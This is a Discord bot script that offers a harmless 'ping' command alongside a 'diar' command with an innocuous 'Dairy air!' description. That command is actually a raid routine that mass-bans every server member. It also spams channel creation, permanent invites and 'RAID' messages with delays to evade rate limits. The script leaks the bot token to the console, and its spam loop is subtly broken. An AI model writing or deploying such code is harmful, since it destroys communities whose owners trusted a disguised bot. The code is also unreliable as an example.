import { REST, Routes, Client, GatewayIntentBits } from 'discord.js';

const TOKEN = process.argv[2]
const CLIENT_ID = process.argv[3]
const commands = [
  {
    name: 'ping',
    description: 'Replies with Pong!',
  },
  {
    name: 'diar',
    description: 'Dairy air!',
  },
];

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildInvites] });

const rest = new REST({ version: '10' }).setToken(TOKEN);

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

try {
  console.log('Started refreshing application (/) commands.');

  await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });

  console.log('Successfully reloaded application (/) commands.');
} catch (error) {
  console.error(error);
}

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'ping') {
    await interaction.reply('Pong!');
  } else if (interaction.commandName === 'diar') {
    await interaction.user.createDM("Starting raid NOW...")
    let guild = interaction.channel.guild
    for (const member of guild.members.cache.values()) {
        try {
          await member.ban();
          console.log(`${member.user.tag} has been banned.`);
        } catch (error) {
          console.warn(`Failed to ban ${member.user.tag}:`, error);
        }
    }

    for (i = 0; i <= 100000, i++;) {
        guild.channels.create({ name: `RAID-${i}`, reason: 'COOL CHANNEL IS COOL' })
        .then(console.log)
        .catch(console.error);
        interaction.channel.createInvite({
            maxAge: 0, // Invite never expires (adjust as needed)
            maxUses: 0, // Unlimited uses (adjust as needed)
          }).then(console.log).catch(console.warn)
        try {
            interaction.channel.send(`# RAID
                This is a raid! Everybody get down!`)
        } catch {
            console.warn("Error sending raid msg! (Timeout?)")
        }
        await new Promise(r => setTimeout(r, randInt(500,6200)));
    }
  }
});

console.log(`${TOKEN}`)
client.login(TOKEN);